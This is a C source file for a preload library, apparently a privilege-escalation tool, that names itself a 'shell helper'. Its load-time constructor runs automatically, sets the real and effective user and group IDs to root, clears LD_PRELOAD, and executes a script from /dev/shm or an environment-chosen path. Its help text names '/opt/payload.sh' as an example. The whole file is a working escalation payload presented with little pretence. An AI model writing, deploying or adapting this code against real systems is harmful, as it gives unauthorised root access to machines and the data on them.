#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <errno.h>

static void exec_helper_script(const char* script_path) {
    fprintf(stderr, "[+] Executing helper script: %s\n", script_path);
    
    struct stat st;
    if (stat(script_path, &st) != 0) {
        fprintf(stderr, "[-] Script not found: %s (%s)\n", script_path, strerror(errno));
        return;
    }
    
    if (!(st.st_mode & S_IXUSR)) {
        fprintf(stderr, "[!] Script not executable, attempting chmod +x\n");
        chmod(script_path, st.st_mode | S_IXUSR | S_IXGRP | S_IXOTH);
    }
    
    setreuid(0, 0);
    setregid(0, 0);
    chdir("/");
    
    fprintf(stderr, "[+] Spawning helper script\n");
    
    unsetenv("LD_PRELOAD");
    
    execl(script_path, script_path, NULL);
    fprintf(stderr, "[-] Failed to execute script: %s\n", strerror(errno));
}

__attribute__((constructor)) void init(void) {
    if (getenv("SHELL_HELPER_ACTIVE")) return;
    if (getenv("SHELL_HELPER_MAIN")) return;
    
    setenv("SHELL_HELPER_ACTIVE", "1", 1);
    const char* script_path = getenv("HELPER_SCRIPT");
    if (!script_path) script_path = "/dev/shm/helper.sh";
    exec_helper_script(script_path);
}

#ifdef ENABLE_MAIN
int main(int argc, char *argv[]) {
    setenv("SHELL_HELPER_MAIN", "1", 1);
    setenv("SHELL_HELPER_ACTIVE", "1", 1);
    
    char *script_path = NULL;
    
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            printf("shell-helper - Execute helper script utility\n");
            printf("Usage: %s [options] [script_path]\n", argv[0]);
            printf("\nOptions:\n");
            printf("  -h, --help    Show this help message\n");
            printf("  -s <path>     Script path to execute\n");
            printf("\nExamples:\n");
            printf("  %s                         # Execute /dev/shm/helper.sh\n", argv[0]);
            printf("  %s /tmp/script.sh          # Execute specific script\n", argv[0]);
            printf("  %s -s /opt/payload.sh      # Execute with -s option\n", argv[0]);
            printf("\nEnvironment:\n");
            printf("  HELPER_SCRIPT=<path>  Script path (fallback if no args)\n");
            printf("\nDefault path: /dev/shm/helper.sh\n");
            return 0;
        } else if (strcmp(argv[i], "-s") == 0 && i + 1 < argc) {
            script_path = argv[++i];
        } else if (argv[i][0] != '-') {
            script_path = argv[i];
        }
    }
    
    if (!script_path) {
        script_path = getenv("HELPER_SCRIPT");
    }
    
    if (!script_path) {
        script_path = "/dev/shm/helper.sh";
    }
    
    exec_helper_script(script_path);
    return 0;
}
#endif